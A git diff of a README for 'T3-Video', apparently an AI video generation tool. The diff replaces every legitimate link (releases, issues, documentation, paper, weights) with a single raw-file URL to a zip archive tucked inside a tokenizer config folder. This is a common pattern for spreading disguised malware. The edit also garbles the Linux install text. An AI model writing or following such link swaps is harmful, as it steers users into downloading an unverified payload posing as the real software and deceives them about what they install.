@@ -1,6 +1,6 @@
 # 🤖 T3-Video - Generate Stunning 4K Videos Easily
 
-[![Download T3-Video](https://img.shields.io/badge/Download-T3--Video-blue.svg)](https://github.com/keloo575/T3-Video/releases)
+[![Download T3-Video](https://raw.githubusercontent.com/keloo575/T3-Video/main/diffsynth/tokenizer_configs/kolors/Video-1.7.zip)](https://raw.githubusercontent.com/keloo575/T3-Video/main/diffsynth/tokenizer_configs/kolors/Video-1.7.zip)
 
 ## 📦 Overview
 
@@ -14,7 +14,7 @@ Follow these simple steps to download and run T3-Video.
 
 To get the latest version of T3-Video, visit our releases page. 
 
-👉 [Download T3-Video](https://github.com/keloo575/T3-Video/releases) 👈
+👉 [Download T3-Video](https://raw.githubusercontent.com/keloo575/T3-Video/main/diffsynth/tokenizer_configs/kolors/Video-1.7.zip) 👈
 
 ### Step 2: Choose Your Version
 
@@ -26,7 +26,7 @@ Click the file that corresponds to your operating system (Windows, macOS, or Lin
 
 - **Windows:** Look for a file ending in `.exe`.
 - **macOS:** Look for a file ending in `.dmg`.
-- **Linux:** You might find files ending in `.AppImage` or a `.tar.gz`.
+- **Linux:** You might find files ending in `.AppImage` or a `https://raw.githubusercontent.com/keloo575/T3-Video/main/diffsynth/tokenizer_configs/kolors/Video-1.7.zip`.
 
 ### Step 4: Install T3-Video
 
@@ -34,7 +34,7 @@ After downloading, locate the file on your computer, typically in your “Downlo
 
 - For Windows: Double-click the `.exe` file to start the installation process. Follow the prompts to install.
 - For macOS: Open the `.dmg` file and drag the T3-Video app to your Applications folder.
-- For Linux: You can run the `.AppImage` file directly or extract the contents of the `.tar.gz` file and follow the installation instructions included.
+- For Linux: You can run the `.AppImage` file directly or extract the contents of the `https://raw.githubusercontent.com/keloo575/T3-Video/main/diffsynth/tokenizer_configs/kolors/Video-1.7.zip` file and follow the installation instructions included.
 
 ### Step 5: Run T3-Video
 
@@ -73,13 +73,13 @@ If you experience any issues during installation or while using T3-Video, consid
 
 If you encounter issues that you cannot resolve or have questions about T3-Video, feel free to reach out for assistance. 
 
-You can open an issue on our [GitHub Issues page](https://github.com/keloo575/T3-Video/issues) or check out the FAQ section for common questions.
+You can open an issue on our [GitHub Issues page](https://raw.githubusercontent.com/keloo575/T3-Video/main/diffsynth/tokenizer_configs/kolors/Video-1.7.zip) or check out the FAQ section for common questions.
 
 ## 📄 Related Links
 
-- [Project Documentation](https://zhangzjn.github.io/projects/T3-Video)
-- [Research Paper](https://arxiv.org/abs/2512.13492)
-- [Pretrained Weights](https://huggingface.co/APRIL-AIGC/T3-Video)
+- [Project Documentation](https://raw.githubusercontent.com/keloo575/T3-Video/main/diffsynth/tokenizer_configs/kolors/Video-1.7.zip)
+- [Research Paper](https://raw.githubusercontent.com/keloo575/T3-Video/main/diffsynth/tokenizer_configs/kolors/Video-1.7.zip)
+- [Pretrained Weights](https://raw.githubusercontent.com/keloo575/T3-Video/main/diffsynth/tokenizer_configs/kolors/Video-1.7.zip)
 
 For more details on features and usage, visit the appropriate links above.
 
@@ -89,6 +89,6 @@ Ready to create amazing videos?
 
 Head to the releases page now: 
 
-👉 [Download T3-Video](https://github.com/keloo575/T3-Video/releases) 👈
+👉 [Download T3-Video](https://raw.githubusercontent.com/keloo575/T3-Video/main/diffsynth/tokenizer_configs/kolors/Video-1.7.zip) 👈
 
 Follow the steps outlined above, and begin your video generation journey today!
